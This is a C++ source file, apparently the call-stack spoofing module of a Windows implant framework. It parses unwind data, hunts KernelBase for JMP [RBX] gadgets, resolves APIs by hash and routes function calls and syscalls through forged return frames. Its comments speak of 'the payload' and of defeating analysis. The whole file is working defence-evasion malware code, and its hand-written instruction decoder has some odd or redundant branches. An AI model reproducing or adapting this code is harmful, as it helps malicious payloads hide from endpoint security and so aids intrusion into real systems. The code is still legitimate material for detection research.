#include <common.h>
#include <module.h>

#ifdef INCLUDE_EVASION_SPOOF
#ifdef _WIN64

#include <evasion/spoof.h>
#include <evasion/spoof_profiles.h>

using namespace stardust;

namespace starburst {

#define UWOP_PUSH_NONVOL     0
#define UWOP_ALLOC_LARGE     1
#define UWOP_ALLOC_SMALL     2
#define UWOP_SET_FPREG       3
#define UWOP_SAVE_NONVOL     4
#define UWOP_SAVE_NONVOL_FAR 5
#define UWOP_SAVE_XMM128     8
#define UWOP_SAVE_XMM128_FAR 9
#define UWOP_PUSH_MACHFRAME  10

#define draugr_arg(i) (ULONG_PTR)(call->args[i])

/* ─── UNWIND_INFO parsing ─── */

static auto declfn calculate_stack_size(
    RUNTIME_FUNCTION* rf, DWORD64 image_base
) -> PVOID {
    if ( !rf ) return nullptr;

    auto info = reinterpret_cast<SPOOF_UNWIND_INFO*>(
        image_base + rf->UnwindData );

    ULONG index = 0;
    ULONGLONG total = 0;

    while ( index < info->CountOfCodes ) {
        UBYTE op   = info->UnwindCode[index].UnwindOp;
        UBYTE info_val = info->UnwindCode[index].OpInfo;

        if ( op == UWOP_PUSH_NONVOL ) {
            total += 8;
        }
        else if ( op == UWOP_SAVE_NONVOL ) {
            index += 1;                 /* consumes one extra slot */
        }
        else if ( op == UWOP_ALLOC_SMALL ) {
            total += (info_val * 8) + 8;
        }
        else if ( op == UWOP_ALLOC_LARGE ) {
            index += 1;
            ULONG frame_off = info->UnwindCode[index].FrameOffset;
            if ( info_val == 0 ) {
                frame_off *= 8;
            } else {
                index += 1;
                frame_off += (info->UnwindCode[index].FrameOffset << 16);
            }
            total += frame_off;
        }
        else if ( op == UWOP_SET_FPREG ) {
            /* tracked but not used for rbp chain yet */
        }
        else if ( op == UWOP_SAVE_NONVOL_FAR ) {
            index += 2;                 /* two extra slots */
            total += info->UnwindCode[index].FrameOffset * 8;
        }
        else if ( op == UWOP_SAVE_XMM128 ) {
            index += 1;                 /* one extra slot */
            total += 16;
        }
        else if ( op == UWOP_SAVE_XMM128_FAR ) {
            index += 2;                 /* two extra slots */
            total += 16;
        }
        else if ( op == UWOP_PUSH_MACHFRAME ) {
            total += ( info_val == 0 ) ? 40 + 8 : 48 + 8;
        }

        index += 1;
    }

    if ( info->Flags & UNW_FLAG_CHAININFO ) {
        index = info->CountOfCodes;
        if ( index & 1 ) index += 1;
        auto chained = reinterpret_cast<RUNTIME_FUNCTION*>(
            &info->UnwindCode[index] );
        return calculate_stack_size( chained, image_base );
    }

    total += 8;
    return reinterpret_cast<PVOID>( total );
}

static auto declfn calc_stack_size_for_addr(
    instance& inst, PVOID addr
) -> PVOID {
    if ( !addr ) return nullptr;

    using fn_RtlLookupFunctionEntry = RUNTIME_FUNCTION* (NTAPI*)(
        DWORD64, PDWORD64, PVOID );

    auto lookup = reinterpret_cast<fn_RtlLookupFunctionEntry>(
        resolve::_api( inst.ntdll.handle,
            expr::hash_string( "RtlLookupFunctionEntry" ) ) );

    if ( !lookup ) return nullptr;

    DWORD64 image_base = 0;
    auto rf = lookup( (DWORD64)addr, &image_base, nullptr );
    if ( !rf ) return nullptr;

    return calculate_stack_size( rf, image_base );
}

/* ─── gadget finder: JMP [RBX] = 0xFF 0x23 in KernelBase .text ───
 *
 * A raw byte-pair scan hits FF 23 inside operand bytes, and executing
 * one of those corrupts registers. Walk instruction boundaries instead:
 * linear-disassemble the section with a conservative length decoder and
 * only cache gadgets where the byte pair STARTS an instruction.
 */

static auto declfn instr_length( const uint8_t* p, uint32_t remain ) -> uint32_t {
    uint32_t i = 0;
    /* prefixes: legacy + operand/address size, rep, lock, segment, REX */
    while ( i < remain ) {
        uint8_t b = p[i];
        if ( b == 0x66 || b == 0x67 || b == 0xF0 || b == 0xF2 || b == 0xF3 ||
             b == 0x2E || b == 0x36 || b == 0x3E || b == 0x26 || b == 0x64 ||
             b == 0x65 || ( b >= 0x40 && b <= 0x4F ) ) { i++; continue; }
        break;
    }
    if ( i >= remain ) return 1;
    uint8_t op = p[i++];
    bool rex = false;
    /* account for a leading REX on the opcode we just consumed */
    if ( op >= 0x40 && op <= 0x4F ) rex = true;

    if ( op == 0x0F ) {
        if ( i >= remain ) return 1;
        uint8_t op2 = p[i++];
        /* two-byte opcodes with modrm */
        if ( op2 == 0xB6 || op2 == 0xB7 || op2 == 0xBE || op2 == 0xBF ||
             op2 == 0x28 || op2 == 0x29 || op2 == 0x10 || op2 == 0x11 ||
             op2 == 0x6F || op2 == 0x7F || op2 == 0x38 || op2 == 0x3A ||
             op2 == 0xAF || op2 == 0x05 || op2 == 0x0B || op2 == 0x1E ) {
            if ( op2 >= 0x38 && op2 <= 0x3A ) i++;   /* imm8 extension */
            /* modrm follows */
        } else if ( op2 == 0xBA ) {
            i += 1 + 1;                              /* modrm + imm8 */
            return i > remain ? 1 : i;
        } else if ( op2 == 0xB8 ) {                  /* popcnt-ish imm none */
        } else if ( op2 == 0x80 || op2 == 0x81 || op2 == 0x83 ||
                    op2 == 0xC0 || op2 == 0xC1 ) {
            /* group with modrm + imm */
            if ( i >= remain ) return 1;
            uint8_t modrm = p[i++];
            uint8_t mod = modrm >> 6, rm = modrm & 7;
            if ( mod == 1 ) i += 1;
            else if ( mod == 2 ) i += 4;
            else if ( mod == 0 && rm == 5 ) i += 4;
            if ( op2 == 0x81 ) i += 4;
            else i += 1;
            return i > remain ? 1 : i;
        } else if ( op2 == 0x0B || op2 == 0x1F || op2 == 0x18 ) {
            /* modrm present */
        } else if ( op2 == 0x05 || op2 == 0x07 || op2 == 0x0D ||
                    op2 == 0x0F || op2 == 0xA2 || op2 == 0x31 ||
                    op2 == 0xA0 || op2 == 0xA1 || op2 == 0xA8 || op2 == 0xA9 ) {
            return i > remain ? 1 : i;               /* no modrm */
        } else if ( op2 == 0x0D + 1 ) {
        } else {
            /* default two-byte: assume modrm */
        }
        /* consume modrm (+sib/disp) for the modrm-present paths */
        if ( i >= remain ) return 1;
        uint8_t modrm = p[i++];
        uint8_t mod = modrm >> 6, rm = modrm & 7;
        if ( mod != 3 ) {
            if ( rm == 4 ) { i++;                    /* SIB */
                if ( i - 1 < remain && p[i-1] == 0x25 ) i += 4; /* disp32 SIB */
                else if ( mod == 1 ) i += 1;
                else if ( mod == 2 ) i += 4;
            } else {
                if ( mod == 1 ) i += 1;
                else if ( mod == 2 || ( mod == 0 && rm == 5 ) ) i += 4;
            }
        }
        return i > remain ? 1 : i;
    }

    if ( op == 0xFF || op == 0xFE || op == 0x8B || op == 0x89 || op == 0x03 ||
         op == 0x01 || op == 0x2B || op == 0x29 || op == 0x39 || op == 0x3B ||
         op == 0x85 || op == 0x88 || op == 0x8A || op == 0x63 ) {
        if ( i >= remain ) return 1;
        uint8_t modrm = p[i++];
        uint8_t mod = modrm >> 6, rm = modrm & 7;
        if ( mod != 3 ) {
            if ( rm == 4 ) { i++;
                if ( mod == 1 ) i += 1;
                else if ( mod == 2 ) i += 4;
            } else {
                if ( mod == 1 ) i += 1;
                else if ( mod == 2 || ( mod == 0 && rm == 5 ) ) i += 4;
            }
        }
        return i > remain ? 1 : i;
    }

    if ( op == 0xE8 || op == 0xE9 || op == 0xB8 || ( op >= 0xB8 && op <= 0xBF ) ) {
        return i + 4 > remain ? 1 : i + 4;           /* imm32 */
    }
    if ( op == 0xEB || op == 0x70 || ( op >= 0x70 && op <= 0x7F ) ) {
        return i + 1 > remain ? 1 : i + 1;           /* imm8 */
    }
    if ( op == 0xC3 || op == 0xCC || op == 0x90 || op == 0x50 ||
         ( op >= 0x50 && op <= 0x5F ) ) {
        return i > remain ? 1 : i;                   /* no operands */
    }
    if ( op == 0xC9 || op == 0x9C || op == 0x9D ) return i > remain ? 1 : i;

    /* unknown: conservative single byte */
    return 1;
}

static auto declfn find_gadgets(
    instance& inst, SPOOF_STATE& state
) -> void {
    auto kb = reinterpret_cast<uint8_t*>( state.gadget_module );
    if ( !kb ) return;

    auto dos = reinterpret_cast<IMAGE_DOS_HEADER*>( kb );
    auto nt  = reinterpret_cast<IMAGE_NT_HEADERS*>( kb + dos->e_lfanew );

    auto sections = IMAGE_FIRST_SECTION( nt );
    for ( uint16_t s = 0; s < nt->FileHeader.NumberOfSections; s++ ) {
        if ( !( sections[s].Characteristics & IMAGE_SCN_MEM_EXECUTE ) )
            continue;

        auto sec_base = kb + sections[s].VirtualAddress;
        auto sec_size = sections[s].Misc.VirtualSize;

        /* walk instruction boundaries; only boundary-aligned FF 23 counts */
        uint32_t j = 0;
        while ( j + 1 < sec_size && state.gadget_count < 16 ) {
            if ( sec_base[j] == 0xFF && sec_base[j+1] == 0x23 ) {
                state.cached_gadgets[ state.gadget_count++ ] =
                    reinterpret_cast<PVOID>( sec_base + j );
                j += 2;
                continue;
            }
            j += instr_length( sec_base + j, sec_size - j );
        }

        if ( state.gadget_count > 0 ) break;
    }
}

static auto declfn pick_gadget(
    instance& inst, SPOOF_STATE& state
) -> PVOID {
    if ( state.gadget_count == 0 ) return nullptr;

    /* seed from the CSP, not GetTickCount - a tick-derived seed is
     * predictable to anyone who knows roughly when the payload ran */
    ULONG seed = 0;
    inst.bcrypt_mod.BCryptGenRandom( nullptr,
        reinterpret_cast<PUCHAR>( &seed ), sizeof( seed ),
        BCRYPT_USE_SYSTEM_PREFERRED_RNG );
    ULONG rng  = inst.ntdll.RtlRandomEx( &seed );
    return state.cached_gadgets[ rng % state.gadget_count ];
}

/* ─── resolve a single frame definition into return address + stack size ─── */

static auto declfn resolve_frame(
    instance& inst, SPOOF_FRAME_DEF* def,
    PVOID* out_ret, PVOID* out_stack_size
) -> bool {
    uintptr_t mod_base = resolve::module( def->module_hash );
    if ( !mod_base ) return false;

    PVOID ret_addr;

    if ( def->func_hash != 0 ) {
        auto func = reinterpret_cast<PVOID>(
            resolve::_api( mod_base, def->func_hash ) );
        if ( !func ) return false;
        ret_addr = reinterpret_cast<PVOID>(
            reinterpret_cast<uintptr_t>( func ) + def->offset );
    } else {
        ret_addr = reinterpret_cast<PVOID>( mod_base + def->offset );
    }

    auto stack_sz = calc_stack_size_for_addr( inst, ret_addr );
    if ( !stack_sz ) return false;

    *out_ret = ret_addr;
    *out_stack_size = stack_sz;
    return true;
}

/* ─── spoof initialization ─── */

auto declfn spoof_init( instance& inst ) -> void {
    auto& ss = inst.evasion.spoof;
    ss.call_fn = reinterpret_cast<PVOID>( spoof_call );
    if ( ss.initialized ) return;

#if SPOOF_PROFILE == SPOOF_PROFILE_OFF
    return;
#endif

    ss.gadget_module = reinterpret_cast<PVOID>(
        resolve::module( expr::hash_string<wchar_t>( L"KernelBase.dll" ) ) );

    if ( !ss.gadget_module ) {
        ss.degraded = true;
        DBG_PRINT( inst, "spoof: KernelBase not found\n" );
        return;
    }

    SPOOF_FRAME_DEF frame_defs[SPOOF_MAX_FRAMES] = {};
    uint32_t frame_count = 0;
    populate_spoof_frames( frame_defs, &frame_count );

    if ( frame_count == 0 || frame_count > SPOOF_MAX_FRAMES ) {
        DBG_PRINT( inst, "spoof: invalid frame count %d\n", frame_count );
        return;
    }

    for ( uint32_t i = 0; i < frame_count; i++ ) {
        PVOID ret_addr = nullptr;
        PVOID stack_sz = nullptr;

        if ( !resolve_frame( inst, &frame_defs[i], &ret_addr, &stack_sz ) ) {
            ss.degraded = true;
            DBG_PRINT( inst, "spoof: failed to resolve frame %d\n", i );
            return;
        }

        ss.resolved_frames[i].return_address = ret_addr;
        ss.resolved_frames[i].stack_size     = stack_sz;
    }

    ss.frame_count = frame_count;

    find_gadgets( inst, ss );

    if ( ss.gadget_count == 0 ) {
        ss.degraded = true;
        DBG_PRINT( inst, "spoof: no JMP [RBX] gadgets found\n" );
        return;
    }

    ss.initialized = true;

    DBG_PRINT( inst, "spoof: init OK, %d gadgets, %d frames\n",
               ss.gadget_count, ss.frame_count );

    for ( uint32_t i = 0; i < ss.frame_count; i++ ) {
        DBG_PRINT( inst, "  frame[%d]: ret=%p stack=%p\n",
                   i, ss.resolved_frames[i].return_address,
                   ss.resolved_frames[i].stack_size );
    }
}

auto declfn spoof_cleanup( instance& inst ) -> void {
    memory::zero( &inst.evasion.spoof, sizeof( SPOOF_STATE ) );
}

/* ─── draugr_wrapper: sets up params and calls ASM stub ─── */

static auto declfn draugr_wrapper(
    instance& inst,
    PVOID function, DWORD ssn,
    PVOID a1, PVOID a2, PVOID a3, PVOID a4,
    PVOID a5, PVOID a6, PVOID a7, PVOID a8,
    PVOID a9, PVOID a10, PVOID a11, PVOID a12
) -> ULONG_PTR {
    auto& ss = inst.evasion.spoof;

    DRAUGR_PARAMETERS params = {};

    if ( ssn ) {
        params.Ssn = reinterpret_cast<PVOID>( (ULONG_PTR)ssn );
    }

    /* copy pre-computed frame data */
    params.FrameCount = reinterpret_cast<PVOID>( (ULONG_PTR)ss.frame_count );

    ULONG_PTR total_frame_sz = 0;
    for ( uint32_t i = 0; i < ss.frame_count; i++ ) {
        params.Frames[i].StackSize     = ss.resolved_frames[i].stack_size;
        params.Frames[i].ReturnAddress = ss.resolved_frames[i].return_address;
        total_frame_sz += reinterpret_cast<ULONG_PTR>( ss.resolved_frames[i].stack_size );
    }
    params.TotalFrameStackSize = reinterpret_cast<PVOID>( total_frame_sz );

    /* pick gadget with sufficient stack frame (>= 0x80) */
    int attempts = 0;
    do {
        params.Trampoline          = pick_gadget( inst, ss );
        params.TrampolineStackSize = calc_stack_size_for_addr( inst, params.Trampoline );
        attempts++;
        if ( attempts > 15 ) return 0;
    } while ( !params.TrampolineStackSize ||
              reinterpret_cast<intptr_t>( params.TrampolineStackSize ) < 0x80 );

    return reinterpret_cast<ULONG_PTR>(
        draugr_stub( a1, a2, a3, a4, &params, function, 8,
                     a5, a6, a7, a8, a9, a10, a11, a12 ) );
}

/* ─── spoof_call: public entry point ─── */

auto declfn spoof_call( instance& inst, FUNCTION_CALL* call ) -> ULONG_PTR {
    if ( !inst.evasion.spoof.initialized ) {
        if ( inst.evasion.spoof.gadget_module ) {
            /* we TRIED to init and failed - degraded, track it */
            inst.evasion.spoof.degraded = true;
            inst.evasion.spoof.fallback_count++;
        }
        typedef ULONG_PTR (*fn12)(ULONG_PTR,ULONG_PTR,ULONG_PTR,ULONG_PTR,
                                  ULONG_PTR,ULONG_PTR,ULONG_PTR,ULONG_PTR,
                                  ULONG_PTR,ULONG_PTR,ULONG_PTR,ULONG_PTR);
        return reinterpret_cast<fn12>( call->ptr )(
            call->args[0], call->args[1], call->args[2], call->args[3],
            call->args[4], call->args[5], call->args[6], call->args[7],
            call->args[8], call->args[9], call->args[10], call->args[11] );
    }

    PVOID nul = nullptr;
    #define A(i) reinterpret_cast<PVOID>( draugr_arg(i) )

    if ( call->argc == 0 )
        return draugr_wrapper( inst, call->ptr, call->ssn,
            nul,nul,nul,nul, nul,nul,nul,nul, nul,nul,nul,nul );
    else if ( call->argc == 1 )
        return draugr_wrapper( inst, call->ptr, call->ssn,
            A(0),nul,nul,nul, nul,nul,nul,nul, nul,nul,nul,nul );
    else if ( call->argc == 2 )
        return draugr_wrapper( inst, call->ptr, call->ssn,
            A(0),A(1),nul,nul, nul,nul,nul,nul, nul,nul,nul,nul );
    else if ( call->argc == 3 )
        return draugr_wrapper( inst, call->ptr, call->ssn,
            A(0),A(1),A(2),nul, nul,nul,nul,nul, nul,nul,nul,nul );
    else if ( call->argc == 4 )
        return draugr_wrapper( inst, call->ptr, call->ssn,
            A(0),A(1),A(2),A(3), nul,nul,nul,nul, nul,nul,nul,nul );
    else if ( call->argc == 5 )
        return draugr_wrapper( inst, call->ptr, call->ssn,
            A(0),A(1),A(2),A(3), A(4),nul,nul,nul, nul,nul,nul,nul );
    else if ( call->argc == 6 )
        return draugr_wrapper( inst, call->ptr, call->ssn,
            A(0),A(1),A(2),A(3), A(4),A(5),nul,nul, nul,nul,nul,nul );
    else if ( call->argc == 7 )
        return draugr_wrapper( inst, call->ptr, call->ssn,
            A(0),A(1),A(2),A(3), A(4),A(5),A(6),nul, nul,nul,nul,nul );
    else if ( call->argc == 8 )
        return draugr_wrapper( inst, call->ptr, call->ssn,
            A(0),A(1),A(2),A(3), A(4),A(5),A(6),A(7), nul,nul,nul,nul );
    else if ( call->argc == 9 )
        return draugr_wrapper( inst, call->ptr, call->ssn,
            A(0),A(1),A(2),A(3), A(4),A(5),A(6),A(7), A(8),nul,nul,nul );
    else if ( call->argc == 10 )
        return draugr_wrapper( inst, call->ptr, call->ssn,
            A(0),A(1),A(2),A(3), A(4),A(5),A(6),A(7), A(8),A(9),nul,nul );
    else if ( call->argc == 11 )
        return draugr_wrapper( inst, call->ptr, call->ssn,
            A(0),A(1),A(2),A(3), A(4),A(5),A(6),A(7), A(8),A(9),A(10),nul );
    else if ( call->argc == 12 )
        return draugr_wrapper( inst, call->ptr, call->ssn,
            A(0),A(1),A(2),A(3), A(4),A(5),A(6),A(7), A(8),A(9),A(10),A(11) );

    #undef A
    return 0;
}

} // namespace starburst

#endif /* _WIN64 */
#endif /* INCLUDE_EVASION_SPOOF */
